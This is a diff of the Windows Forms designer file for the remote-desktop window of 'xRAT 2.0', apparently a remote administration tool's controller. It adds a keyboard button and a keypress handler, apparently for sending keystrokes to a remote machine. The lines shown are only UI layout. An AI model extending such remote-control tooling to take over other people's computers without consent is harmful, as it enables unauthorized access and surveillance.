@@ -37,6 +37,7 @@
             this.btnMouse = new System.Windows.Forms.Button();
             this.picDesktop = new System.Windows.Forms.PictureBox();
             this.panelTop = new System.Windows.Forms.Panel();
+            this.btnKeyboard = new System.Windows.Forms.Button();
             this.cbMonitors = new System.Windows.Forms.ComboBox();
             this.btnHide = new System.Windows.Forms.Button();
             this.btnShow = new System.Windows.Forms.Button();
@@ -123,6 +124,7 @@
             // panelTop
             // 
             this.panelTop.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.panelTop.Controls.Add(this.btnKeyboard);
             this.panelTop.Controls.Add(this.cbMonitors);
             this.panelTop.Controls.Add(this.btnHide);
             this.panelTop.Controls.Add(this.lblQualityShow);
@@ -131,10 +133,20 @@
             this.panelTop.Controls.Add(this.btnStop);
             this.panelTop.Controls.Add(this.lblQuality);
             this.panelTop.Controls.Add(this.barQuality);
-            this.panelTop.Location = new System.Drawing.Point(189, 0);
+            this.panelTop.Location = new System.Drawing.Point(193, 0);
             this.panelTop.Name = "panelTop";
-            this.panelTop.Size = new System.Drawing.Size(384, 57);
+            this.panelTop.Size = new System.Drawing.Size(410, 57);
             this.panelTop.TabIndex = 7;
+            // 
+            // btnKeyboard
+            // 
+            this.btnKeyboard.Image = global::xServer.Properties.Resources.keyboard_delete;
+            this.btnKeyboard.Location = new System.Drawing.Point(374, 10);
+            this.btnKeyboard.Name = "btnKeyboard";
+            this.btnKeyboard.Size = new System.Drawing.Size(28, 28);
+            this.btnKeyboard.TabIndex = 9;
+            this.btnKeyboard.UseVisualStyleBackColor = true;
+            this.btnKeyboard.Click += new System.EventHandler(this.btnKeyboard_Click);
             // 
             // cbMonitors
             // 
@@ -184,6 +196,7 @@
             this.Text = "xRAT 2.0 - Remote Desktop []";
             this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FrmRemoteDesktop_FormClosing);
             this.Load += new System.EventHandler(this.FrmRemoteDesktop_Load);
+            this.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.FrmRemoteDesktop_KeyPress);
             this.Resize += new System.EventHandler(this.FrmRemoteDesktop_Resize);
             ((System.ComponentModel.ISupportInitialize)(this.barQuality)).EndInit();
             ((System.ComponentModel.ISupportInitialize)(this.picDesktop)).EndInit();
@@ -206,5 +219,6 @@
         private System.Windows.Forms.Button btnHide;
         private System.Windows.Forms.Button btnShow;
         public System.Windows.Forms.ComboBox cbMonitors;
+        private System.Windows.Forms.Button btnKeyboard;
     }
 }
